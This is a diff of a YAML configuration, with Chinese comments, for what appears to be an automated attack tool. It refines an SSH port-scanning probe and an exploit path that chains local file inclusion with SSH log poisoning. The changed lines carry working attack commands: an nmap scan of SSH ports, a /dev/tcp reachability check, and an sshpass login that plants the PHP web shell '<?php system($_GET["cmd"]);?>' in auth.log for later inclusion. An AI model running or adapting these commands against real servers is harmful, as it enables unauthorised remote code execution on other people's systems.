@@ -308,14 +308,21 @@ probes:
         set: { ssh_key_found: true }
 
   - id: check_ssh_port
-    description: "检查 SSH 端口（用于日志注入）"
+    description: "检查 SSH 端口（用于日志注入），捕获真实端口号"
     depends_on: { lfi_confirmed: true }
     command: |
-      nmap -sT -p 22,2211,2222,2022,22222 --open {TARGET_IP} 2>/dev/null | grep "open" || echo "NO_SSH"
+      # 扫常见 SSH 端口，输出带标记便于正则捕获
+      # 格式: SSH_PORT_OPEN:<port>
+      nmap -sT -p 22,2211,2222,2022,22222 --open {TARGET_IP} 2>/dev/null \
+        | awk '/^[0-9]+\/tcp\s+open\s+ssh/ {split($1,a,"/"); print "SSH_PORT_OPEN:" a[1]}' \
+        || echo "NO_SSH"
     timeout: 15
     parse_rules:
-      - if_regex: "\\d+/tcp\\s+open\\s+ssh"
-        set: { ssh_available: true }
+      # 先匹配带端口号的明文标记；没命中就退回到老的通用 flag
+      - if_regex: "SSH_PORT_OPEN:(\\d+)"
+        set: { ssh_available: true, ssh_port: "$1" }
+      - if_regex: "(\\d+)/tcp\\s+open\\s+ssh"
+        set: { ssh_available: true, ssh_port: "$1" }
 
 exploit_paths:
   - path_id: lfi_wrapper_rce
@@ -404,13 +411,26 @@ exploit_paths:
         description: "SSH 日志注入 + LFI 包含 auth.log（使用已确认参数和深度）"
         command: |
           BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
-          SSH_PORT="{TARGET_PORT}"
-          if ! echo "$SSH_PORT" | grep -Eq '^[0-9]+$'; then
+
+          # SSH 端口选择顺序：
+          #   1) check_ssh_port 探针捕获的 {ssh_port}
+          #   2) 未替换/非数字 → 用标准端口 22（不要用 TARGET_PORT，那是 Web 端口）
+          SSH_PORT="{ssh_port}"
+          if [ -z "$SSH_PORT" ] || [ "$SSH_PORT" = "{ssh_port}" ] \
+             || ! echo "$SSH_PORT" | grep -Eq '^[0-9]+$'; then
             SSH_PORT=22
           fi
+
           PAYLOAD='<?php system($_GET["cmd"]);?>'
           echo "=== SSH Log Poisoning ==="
           echo "[INFO] SSH poison target: {TARGET_IP}:$SSH_PORT"
+
+          # 先快速确认 SSH 端口真的可达，避免空打日志注入浪费时间
+          if ! (exec 3<>/dev/tcp/{TARGET_IP}/"$SSH_PORT") 2>/dev/null; then
+            echo "[WARN] SSH port $SSH_PORT on {TARGET_IP} not reachable, skip SSH user-poison (仍会走 nc banner 回落)"
+            SSH_UNREACHABLE=1
+          fi
+          exec 3>&- 3<&- 2>/dev/null || true
           SSH_ERR=$(sshpass -p "x" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
             -p "$SSH_PORT" \
             "$PAYLOAD"@{TARGET_IP} 2>&1 || true)
